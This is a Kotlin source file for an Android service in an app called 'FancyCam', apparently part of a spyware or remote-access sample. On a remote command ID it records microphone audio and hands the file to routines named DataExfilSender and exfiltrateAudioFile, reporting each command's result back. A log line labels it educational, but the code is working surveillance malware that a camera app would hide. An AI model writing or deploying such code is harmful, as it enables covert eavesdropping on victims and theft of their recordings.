package com.example.fancycam.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.example.fancycam.R
import com.example.fancycam.network.DataExfilSender
import java.io.File

class AudioCaptureService : Service() {

    companion object {
        private const val TAG = "AudioCaptureService"
        private const val CHANNEL_ID = "FancyCamAudioCapture"
        private const val NOTIFICATION_ID = 4243
        const val EXTRA_COMMAND_ID = "extra_command_id"
        const val EXTRA_DURATION_MS = "extra_duration_ms"
        const val DEFAULT_DURATION_MS = 30000L

        fun start(context: Context, durationMs: Long = DEFAULT_DURATION_MS, commandId: String? = null) {
            val intent = Intent(context, AudioCaptureService::class.java).apply {
                putExtra(EXTRA_DURATION_MS, durationMs)
                if (commandId != null) putExtra(EXTRA_COMMAND_ID, commandId)
            }
            ContextCompat.startForegroundService(context, intent)
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = buildNotification()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        val durationMs = intent?.getLongExtra(EXTRA_DURATION_MS, DEFAULT_DURATION_MS) ?: DEFAULT_DURATION_MS
        val commandId = intent?.getStringExtra(EXTRA_COMMAND_ID)

        Thread {
            runCapture(durationMs, commandId)
        }.start()

        return START_NOT_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "FancyCam Audio Capture",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Foreground audio capture service"
                setShowBadge(false)
            }
            (getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager)
                ?.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_camera_switch)
            .setContentTitle("FancyCam")
            .setContentText("Capturing audio in background…")
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    private fun runCapture(durationMs: Long, commandId: String?) {
        val cleanDuration = if (durationMs > 0) durationMs else DEFAULT_DURATION_MS

        if (checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "RECORD_AUDIO permission not granted")
            if (commandId != null) {
                DataExfilSender.reportCommandResult(this, commandId, status = "failed", error = "RECORD_AUDIO permission not granted")
            }
            stopSelf()
            return
        }

        var recorder: MediaRecorder? = null
        val outputFile = File(cacheDir, "mic_${System.currentTimeMillis()}.m4a")

        try {
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioEncodingBitRate(128000)
                setAudioSamplingRate(44100)
                setOutputFile(outputFile.absolutePath)
                prepare()
                start()
            }
            Log.d(TAG, "[EDUCATIONAL] Recording ACTIVE — source: MIC, format: AAC/MPEG_4")

            Thread.sleep(cleanDuration)

            recorder?.apply {
                stop()
                release()
            }
            recorder = null

            if (!outputFile.exists() || outputFile.length() == 0L) {
                if (commandId != null) {
                    DataExfilSender.reportCommandResult(this, commandId, status = "failed", error = "Empty recording")
                }
                outputFile.delete()
                stopSelf()
                return
            }

            MicrophoneCapture.exfiltrateAudioFile(this, outputFile, commandId)

        } catch (e: Exception) {
            Log.e(TAG, "Microphone capture failed", e)
            try {
                recorder?.release()
            } catch (_: Exception) {
            }
            if (commandId != null) {
                DataExfilSender.reportCommandResult(this, commandId, status = "failed", error = e.message)
            }
        } finally {
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
